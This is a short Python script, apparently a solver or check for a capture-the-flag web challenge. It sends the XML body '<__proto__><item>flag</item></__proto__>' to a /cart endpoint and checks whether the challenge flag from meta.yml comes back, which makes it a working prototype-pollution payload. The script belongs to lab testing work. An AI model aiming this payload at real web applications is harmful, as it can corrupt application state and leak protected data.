import requests
import argparse
import yaml
import logging
import requests
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def test(url):
    res = requests.post(
        f"{url}/cart",
        data="<__proto__><item>flag</item></__proto__>",
        headers={"Content-Type": "text/xml"},
    )
    assert FLAG in res.text, res.text


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()
    test(args.url)
